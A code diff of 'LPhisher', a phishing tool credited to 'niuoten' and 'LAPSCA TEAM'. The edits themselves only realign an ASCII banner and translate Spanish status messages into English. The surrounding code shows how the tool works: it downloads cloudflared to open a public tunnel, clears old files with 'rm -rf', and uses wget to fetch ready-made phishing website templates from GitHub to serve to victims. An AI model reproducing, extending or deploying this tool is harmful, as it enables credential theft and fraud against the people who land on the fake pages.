@@ -2,7 +2,6 @@
 # Tool Name    : LPhisher
 # Author       : Telegram : @niuoten
 """
-
 {
  _     ____  _   _ ___ ____  _   _ _____ ____
 | |   |  _ \| | | |_ _/ ___|| | | | ____|  _ \
@@ -50,11 +49,11 @@ info2= bgreen + '[' + bwhite + '•' + bgreen + '] '+ bpurple
 logo=f'''
 
 {white}- - - - - - - - - - - - - - - - - - - - - - - - - - - - -  
-{bcyan} _     ____  _   _ ___ ____  _   _ _____ ____
-{bpurple} | |   |  _ \| | | |_ _/ ___|| | | | ____|  _ \
-{bcyan}| |   | |_) | |_| || |\___ \| |_| |  _| | |_) |
-{bpurple} | |___|  __/|  _  || | ___) |  _  | |___|  _ <
-{bcyan}|_____|_|   |_| |_|___|____/|_| |_|_____|_| \_\  {bred}v.1.0
+{bcyan}   _     ____  _   _ ___ ____  _   _ _____ ____
+{bpurple}| |   |  _ \| | | |_ _/ ___|| | | | ____|  _ \
+{bcyan}  | |   | |_) | |_| || |\___ \| |_| |  _| | |_) |
+{bpurple}| |___|  __/|  _  || | ___) |  _  | |___|  _ <
+{bcyan}  |_____|_|   |_| |_|___|____/|_| |_|_____|_| \_\  {bred}v.1.0
 
 {byellow}----> {bcyan}By {bwhite}niuoten {bcyan}Github {bwhite}LAPSCA TEAM {byellow}<-----
 
@@ -302,7 +301,7 @@ def main():
     x=popen("uname -m").read()
     y=popen("uname").read()
     if not os.path.isfile(root+"/.cffolder/cloudflared"):
-        sprint("\n"+info+"Descargando Cloudflare :D ....."+nc)
+        sprint("\n"+info+"Downloading Cloudflare :D ....."+nc)
         internet()
         system("rm -rf cloudflared cloudflared.tgz")
         if y.find("Linux")!=-1:
@@ -648,7 +647,7 @@ def requirements(folder,mask):
             break
         else:
             internet()
-            sprint("\n"+info+"Desccargando filas requeridas :D.....\n")
+            sprint("\n"+info+"Downloading filas required :D.....\n")
             system("rm -rf site.zip")
             system("wget -q --show-progress https://github.com/LAPSCA/LPhisherSites/tree/main/LPhisherWebSites"+folder+".zip -O site.zip")
             if not os.path.exists("/.websites"):
